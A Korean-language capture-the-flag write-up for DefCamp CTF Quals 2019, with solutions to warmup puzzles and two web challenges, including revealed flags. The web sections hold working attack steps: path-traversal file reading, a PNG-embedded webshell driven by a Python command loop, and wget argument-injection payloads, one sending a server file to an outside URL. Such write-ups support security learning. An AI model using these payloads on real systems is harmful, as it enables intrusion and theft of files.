# DefCamp CTF Quals
with team `K.knock`(115 / 483)  

## Warmup
[base](#base)  
[Salad](#salad)  
[Address](#address)  
[Cross or zero](#cross-or-zero)  
[Mountain](#mountain)  
[Corrupt](#corrupt)  
[Password](#password)  

## Web
[imgur](#imgur)  
[Downloader v1](#downloader-v1)  


# base
nc 206.81.24.129 4441  

## What is prob
접속해보면 10진수를 주고 16진수로 무엇이냐고 묻는다. 시간제한이 있어서 수기로 하기에는 무리가 있었다. 코딩해보면 잘 맞추면 2단계로 `16 -> ascii`를, 또 통과하면 `8 -> ascii`를 묻는다. 차례대로 코딩해주면 된다.  

## POC
``` python
from Crypto.Util import number
from pwn import *

p = remote("206.81.24.129",4441)

def getData():
    data = p.recvuntil(":")
    print(data)
    data = data[data.index("<<")+2:data.index(">>")]
    print("Get : "+data)
    return data

# dec to hex
r = hex(int(getData()))
p.send(r+"\n")

# hex to ascii
r = number.long_to_bytes(int("0x"+getData(),16))
p.send(r+"\n")

# oct to ascii
o_list = getData().split(" ")
r = ""
for i in o_list:
    r += chr(int("0o"+i,8))
p.send(r+"\n")

print(p.recvall())
```

## flag
대회 종료 이후 nc 연결 안됨.

# Salad
Can you guess my favorite salad name? ONEQ{m3nq67n8l4559247641o321qm60q1mp7751m4075oqp72nl351q0072131p6oom1}  
Author: Lucian

# Address
What is your address?  
Target: 206.81.24.129:9947  
Author: Lucian  

# Cross or zero
Can you find the key and the flag? I bet. It is not an encryption. It is ZERO. Code:
``` python
import itertools
import base64

def string_xor(s, key):
    key = key * (len(s) / len(key) + 1)
    return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in itertools.izip(s, key)) 

flag = ""
key = ""

print base64.b64encode(string_xor(flag, key))

# dHNkdktUAFMBA1MIBglWBgkFCFEGBQlUCQRRBAgIBgQAVVRUAwkEBFEAAVRVVVRTBFRWBQdUBlMAB1YJVQYIBwIIBFVSTQ==
```
Author: Lucian  

## POC
FLAG의 앞 4bytes가 `DCTF`임을 알기때문에 몇번 돌려보면 key가 48임을 알 수 있다.
``` python
import base64

key = 48
q = "dHNkdktUAFMBA1MIBglWBgkFCFEGBQlUCQRRBAgIBgQAVVRUAwkEBFEAAVRVVVRTBFRWBQdUBlMAB1YJVQYIBwIIBFVSTQ=="
q = base64.b64decode(q)

lst = [ord(i) for i in q]

flag = ""
for i in lst:
    flag += chr(i ^ key)

print(flag)
```
## flag
`DCTF{d0c13c869f6958a659d94a488640edd3944a01deedc4df57d6c07f9e687284eb}`


# Mountain
Take a look at those mountains!  
Author: Lucian



# Corrupt
I can not recover this corrupt file!  
Author: Lucian
## Analysis
`flag.docx.zip` 파일이 주어진다. 압축을 풀면 `flag.docx`가 있고, 열리지 않는다. `docx` 특성상 시그니처가 압축파일과 같고, 실제로 압축을 풀면 내부 구조가 나온다.

## ??
확인차 `HxD`로 열어보면 이상하게 `.tar.xz` 압축파일 시그니처를 가지고 있는 것을 볼 수 있다.

## Solve
일단 확장자를 `flag.docx`에서 `flag.tar.xz`로 바꾸어 압축을 풀어보면 `flag.txt`를 구할 수 있다.

## flag
`DCTF{a0bd4e405bc4e1fcf840c7c231181970e2b6fde7c60d4a0a415897bf07f8e17b}`



# Password
Can you find the password? I am asking for a friend.  
Author: Lucian  

## play
`chall.pyc` 파일이 주어진다. [Decompile tool](https://sourceforge.net/projects/easypythondecompiler/)을 이용해 디컴파일을 했다.

## py code
``` python
# Embedded file name: chall.py
a = 'DCTF{09fa'
c = '4d3142a6a'
b = '7ab70e9aa'
f = '1929d62e0'
g = '805934d86'
d = 'd4b55ea5b'
e = '1a436b536'
h = '59eadd}'
flag = a + b + c + d + e + f + g + h
password = 'Pass999990000!!!))))'
print 'Enter the password: '
buf = raw_input()
if password == buf:
    print flag
else:
    print 'Wrong password!'
```

## POC
패스워드 넣으면 되긴 한데 나는 그냥 밑의 코드를 다 지우고 플래그를 출력했다.
``` PYTHON
# Embedded file name: chall.py
a = 'DCTF{09fa'
c = '4d3142a6a'
b = '7ab70e9aa'
f = '1929d62e0'
g = '805934d86'
d = 'd4b55ea5b'
e = '1a436b536'
h = '59eadd}'
flag = a + b + c + d + e + f + g + h
print(flag)
```

## flag
`DCTF{09fa7ab70e9aa4d3142a6ad4b55ea5b1a436b5361929d62e0805934d8659eadd}`


# imgur
This is an out of the box challenge with a very "professional" and complex interface. Get in and print the flag.  
Target: https://imgur.dctfq19.def.camp  
Author: Andrei  

## find LFI
문제의 홈페이지는 page라는 인자로 들어온 파일을 열어준다. 여기에서 `../../../../../etc/passwd` 해주면 해당 파일을 가져오는 것을 알 수 있다.

## imgur?
문제의 홈페이지는 imgur에 업로드된 사진만 프로필 사진으로 올릴 수 있다. 프로필에 웹쉘을 올리는 거라고 생각했지만 imgur 사이트로 필터걸려있는 부분이 우회가 안됐다. imgur는 상용 사이트였고, 나는 절대 저 사이트에 웹쉘을 올리는 방법이 풀이가 아닐 것이라 생각했다.

## real hacking?
실제로 imgur 사이트에 웹쉘을 업로드 하고 이를 문제 사이트에 업로드 해서 푸는 문제였다. 이게 아무리 imgur 사이트에 피해가 발생하지 않았다고 하더라도,,, 괜찮은걸까? 아무튼 문제는 풀고싶기 때문에 [png idat 영역에 웹쉘을 넣는 방식](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)으로 imgur 사이트에 웹쉘 이미지를 업로드했다. 업로드된 이미지의 주소를 문제 사이트에 프로필로 업로드했다. 이 웹쉘과 통신하는 코드를 짜서 마치 쉘을 이용하듯이 서버를 뒤졌다.
```python
import requests

url = "https://imgur.dctfq19.def.camp/index.php?0=shell_exec&page=profiles/myimg.jpg"

cookie = {'PHPSESSID':'mysession'}


while True:
    cmd = input("\n$ ")
    if cmd == "exit":
        break
    res = requests.post(url, data={1:cmd})
    data = res.text.split("c\\")[1].split("X")[0]
    print(data)
```
위의 코드를 실행하여 아래와 같이 플래그를 찾았다.
```sh
$ ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var


$ ls /home
dctf


$ ls /home/dctf/


$ ls -al /home/dctf/
total 24
drwxr-xr-x 1 dctf dctf 4096 Sep  7 16:30 .
drwxr-xr-x 1 root root 4096 Sep  7 16:30 ..
-rw-r--r-- 1 dctf dctf  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dctf dctf 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 dctf dctf  807 Apr  4  2018 .profile
-rw-r--r-- 1 dctf dctf   70 Sep  6 10:54 flag_3d05c1f377122d0af8a3426cd2c9a739

$ cat /home/dctf/flag*
DCTF{762241E8981F7E4C2B134C2894747990989FB5DFF0A3AD8DB5A0CEB5D05CBD8D}
```
## flag
`DCTF{762241E8981F7E4C2B134C2894747990989FB5DFF0A3AD8DB5A0CEB5D05CBD8D}`  
[참고](https://nytr0gen.github.io/writeups/ctf/2019/09/09/defcamp-ctf-quals-2019.html#imgur-202p-web)

# Downloader v1
https://downloader-v1.dctfq19.def.camp  

## page info
파일을 다운로드 할 수 있는 홈페이지다. url을 입력하면 해당 url에 접속하여 다운로드 받는다. `F12`를 눌러 코드를 살펴보니 다음과 같은 코드가 있었다.
``` html 
<!-- <a href="flag.php">###</a> -->
```
이 페이지에 접근하면 `GET ME!`라는 문구가 나온다. 이 페이지를 다운로드 하는것이 이 문제의 목표다.

## Analysis filter
- 몇가지를 입력해본 결과 `wrapper`는 먹히지 않았다.  
- `index.php`, `.htaccess`, `flag.php`에 접근하면 `Sneaky you!`라는 문구와 함께 URL을 동작시키지 않는다. (근데 검사를 맨 끝에만 확인하는건지 ` t`와 같이 아무 문자나 더 붙이면 통과된다.)

## Analysis logic
해당 url의 아무 리소스나 접근해보았다. 결과는 아래와 같다.  
``` bash
$ cd uploads/5d75b5179aa52894be8add812d786
$ wget https://downloader-v1.dctfq19.def.camp/d 2>&1
--2019-09-09 02:12:39--  https://downloader-v1.dctfq19.def.camp/d
Resolving downloader-v1.dctfq19.def.camp (downloader-v1.dctfq19.def.camp)... 206.81.24.129
Connecting to downloader-v1.dctfq19.def.camp (downloader-v1.dctfq19.def.camp)|206.81.24.129|:443... connected.
HTTP request sent, awaiting response... 404 Not Found
2019-09-09 02:12:39 ERROR 404: Not Found.

$ bash -c 'rm uploads/5d75b5179aa52894be8add812d786/*.{php,pht,phtml,php4,php5,php6,php7}'
```
위의 결과를 통해 알 수 있는 것은 다음과 같다.  
- 다운로드는 wget으로 이루어진다.  
- wget 에러를 굳이 표준 출력으로 보여준다.  
- 몇번 더 해본 결과 `upload/{random}`으로 디렉토리가 형성된다.  
- php 실행가능한 확장자는 다운로드 후 `rm`명령어로 삭제한다.(근데 php3는 빼먹었다.)  

위의 로직을 통해 생각해볼 수 있는 공격 경로는 다음과 같다.  
- wget를 `-b` 옵션으로 background로 실행시켜서 rm 명령을 먼저 처리하게 한 후 php 실행 가능한 파일을 다운받는다.  
=> `.htaccess`를 업로드 해봐도 php 실행이 되지 않는다.
- 다운로드 경로를 `index.php`가 있는 상위 경로로 받는다.  
=> 권한이 걸려있음
- 파일을 읽어서 에러를 띄울 수 있을까?

## Attack
`wget`의 `-i`옵션을 이용하면 파일을 읽어서 wget으로 요청한다. 즉, 원래는 요청할 파일 URL 주소들을 파일에 모아놓고 명령 한번으로 파일 속 URL을 모두 요청하는 방식이다. 문제에서 굳이 에러를 출력해준 이유는 이때문이 아닐까 싶다. `flag.php`를 읽어들여서 wget 요청하게 되면 정상 URL이 아니기 때문에 에러를 출력한다. 이를 통해 파일의 데이터를 볼 수 있다.  
**Payload**  
`https://downloader-v1.dctfq19.def.camp/flag.php -i ../../flag.php e`
``` bash
$ cd uploads/5d75b2dc1306f55a0827308711594
$ wget https://downloader-v1.dctfq19.def.camp/flag.php -i ../../flag.php e 2>&1

(...)

--2019-09-09 02:03:08--  http://e/
Resolving e (e)... failed: Name or service not known.
wget: unable to resolve host address 'e'
--2019-09-09 02:03:08--  http://get%20me!/
Resolving get me! (get me!)... failed: Name or service not known.
wget: unable to resolve host address 'get me!'
--2019-09-09 02:03:08--  http://%3C/?php%20/*%20DCTF%7Bf8ebc33b836f0ac262fef4c18d3b18ed405da41bb4389c0d0fa1a5a997da1af0%7D%20*/%20?%3E
Resolving < (<)... failed: Name or service not known.
wget: unable to resolve host address '<'
FINISHED --2019-09-09 02:03:08--
Total wall clock time: 0.2s
Downloaded: 1 files, 8 in 0s (9.18 MB/s)
$ bash -c 'rm uploads/5d75b2dc1306f55a0827308711594/*.{php,pht,phtml,php4,php5,php6,php7}'
```
URL encoding이 되어있다. Chrome 개발자도구(F12)의 console에서 `decodeURI` 함수를 이용해 디코드 하면 다음과 같은 코드가 나온다.
```php
</?php /* DCTF{f8ebc33b836f0ac262fef4c18d3b18ed405da41bb4389c0d0fa1a5a997da1af0} */ ?>
```

## another solve
wget의 `--post-file` 옵션을 이용해서 http body에 파일을 첨부할 수 있다.  
**Payload**  
`https://downloader-v1.dctfq19.def.camp/flag.php --post-file /var/www/html/flag.php {serverURL}`  
서버측에서 요청 패킷을 출력하는 코드를 짜거나 `requestbin.net`을 이용하면 위와 같은 `flag.php`의 코드가 출력된다.

## flag
`DCTF{f8ebc33b836f0ac262fef4c18d3b18ed405da41bb4389c0d0fa1a5a997da1af0}`

게임
nc 206.81.24.129 2337

numbers
nc 206.81.24.129 2337